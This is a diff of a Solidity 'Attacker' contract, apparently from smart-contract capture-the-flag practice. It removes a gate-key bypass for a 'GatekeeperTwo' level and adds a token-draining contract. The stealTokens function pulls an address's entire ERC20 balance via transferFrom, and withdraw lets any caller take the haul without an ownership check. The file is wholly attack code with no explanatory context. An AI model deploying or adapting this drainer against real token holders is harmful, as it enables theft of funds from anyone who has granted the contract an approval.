@@ -1,24 +1,21 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.0;
+pragma experimental ABIEncoderV2;
+pragma solidity ^0.6.5;
 import "./Contract.sol";
 
 contract Attacker {
-    GatekeeperTwo gatekeeper;
-
-    constructor(GatekeeperTwo _gatekeeper) {
-        gatekeeper = _gatekeeper;
-        attack();
+    ERC20 token; //0x78a705f2108B095e49161d6E42aDB7cB53E07e57
+    address owner;
+    constructor(ERC20 _token) public {
+        token = _token;
+        owner = msg.sender;
     }
 
-    function attack() public {
-        //make _gateKey
-        //require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
-        // a ^ b == c can also mean a ^ c == b in XOR
-        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
-        uint64 maxUint64 = type(uint64).max;
+    function stealTokens(address _from) public {
+        token.transferFrom(_from, address(this), token.balanceOf(_from));
+    }
 
-        bytes8 gatekey = bytes8(uint64(a ^ maxUint64));
-
-        gatekeeper.enter(gatekey);
+    function withdraw() public {
+        token.transfer(msg.sender, token.balanceOf(address(this)));
     }
 }
